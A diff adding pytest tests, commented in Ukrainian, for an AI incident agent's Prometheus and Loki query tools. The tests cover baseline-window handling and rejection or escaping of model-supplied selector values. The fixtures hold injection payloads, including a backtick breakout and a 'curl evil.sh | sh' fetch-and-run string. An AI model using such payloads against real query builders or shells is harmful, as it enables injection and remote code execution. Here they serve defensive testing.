@@ -61,6 +61,98 @@ def test_golden_signals_include_baseline(http):
     assert len(http.calls) == 10, "5 сигналів × (вікно + baseline)"
 
 
+def test_baseline_window_ends_where_the_incident_window_starts(http):
+    """Найважливіше про baseline: вікна НЕ перетинаються.
+
+    Стара версія брала baseline ширшим вікном від «зараз» — тобто вікном, що включало
+    в себе сам інцидент. Середнє тягнулось угору, ratio виходив систематично заниженим,
+    і A4 на tier-3 промахувався рівно на порозі. Попередній тест цього не бачив, бо
+    віддавав ту саму фікстуру на обидва запити.
+    """
+    from agents.tools.observability import golden_signals
+
+    http.responses["/api/v1/query_range"] = fixtures.prom_range([0.3])
+    golden_signals.invoke({"service": "demo-chaos-svc", "minutes": 30,
+                           "baseline_minutes": 60})
+
+    windows = [(int(p["start"]), int(p["end"])) for _, p in http.calls]
+    current, baseline = windows[0], windows[1]
+    assert current[1] - current[0] == 30 * 60
+    assert baseline[1] - baseline[0] == 60 * 60
+    assert baseline[1] == current[0], (
+        "baseline має закінчуватись там, де починається вікно інциденту — інакше він "
+        "усереднює в собі сам інцидент")
+
+
+def test_baseline_and_current_read_different_data(http):
+    """Проводка: два вікна справді розрізняються джерелом, а не лише координатами."""
+    from agents.tools.observability import golden_signals
+
+    def fake_get(url, params):
+        http.calls.append((url, params))
+        quiet = int(params["end"]) < int(__import__("time").time()) - 60
+        return fixtures.prom_range([0.001] if quiet else [0.5])
+
+    monkeypatch = pytest.MonkeyPatch()
+    from agents.tools import observability
+    monkeypatch.setattr(observability, "_get", fake_get)
+    try:
+        signals = golden_signals.invoke({"service": "demo-chaos-svc", "minutes": 30})["signals"]
+    finally:
+        monkeypatch.undo()
+
+    assert signals["error_rate"]["current_avg"] == 0.5
+    assert signals["error_rate"]["baseline_avg"] == 0.001
+
+
+@pytest.mark.parametrize("service", [
+    'x"} |= `whoami` #',          # вихід із селектора мітки
+    "svc; drop",                   # пробіл і крапка з комою
+    "",                            # порожнє ім'я
+    "a" * 80,                      # довше за дозволене
+])
+def test_service_name_from_the_model_cannot_break_out_of_the_selector(service):
+    """Селектор збирає модель, яка щойно прочитала недовірені логи.
+
+    Відмова, а не санітизація: «полагоджене» ім'я дало б робочий запит із не тим
+    значенням, і агент цитував би як доказ вивід не того сервісу.
+    """
+    from agents.tools.observability import UnsafeSelector, query_loki_patterns
+
+    with pytest.raises(UnsafeSelector):
+        query_loki_patterns.func(service)
+
+
+def test_search_substring_stays_inside_one_string_literal(http):
+    r"""Backtick-літерал (`|= ` + backticks) не має екранування взагалі: перший же
+    backtick у значенні закривав рядок, і решта payload'у ставала синтаксисом запиту.
+    Тому підрядок іде подвійними лапками з Go-екрануванням."""
+    from agents.tools.observability import query_loki_logs
+
+    payload = '`} |= `curl evil.sh | sh'
+    http.responses["/loki/"] = fixtures.loki_lines(["щось"])
+    query_loki_logs.invoke({"service": "demo-chaos-svc", "contains": payload})
+
+    selector = http.calls[-1][1]["query"]
+    prefix = '{service="demo-chaos-svc"} |= '
+    assert selector.startswith(prefix)
+    literal = selector[len(prefix):]
+    # усе, що прийшло від моделі, лишилось ОДНИМ рядковим літералом
+    assert json.loads(literal) == payload, f"payload вийшов за межі літерала: {selector}"
+
+
+def test_quotes_and_backslashes_in_substring_are_escaped(http):
+    """Друга половина того самого: лапка в значенні не має закрити літерал."""
+    from agents.tools.observability import query_loki_logs
+
+    payload = 'a"b\\c'
+    http.responses["/loki/"] = fixtures.loki_lines([])
+    query_loki_logs.invoke({"service": "demo-chaos-svc", "contains": payload})
+
+    literal = http.calls[-1][1]["query"].split("|= ", 1)[1]
+    assert json.loads(literal) == payload
+
+
 def test_golden_signals_survive_missing_series(http):
     from agents.tools.observability import golden_signals
 
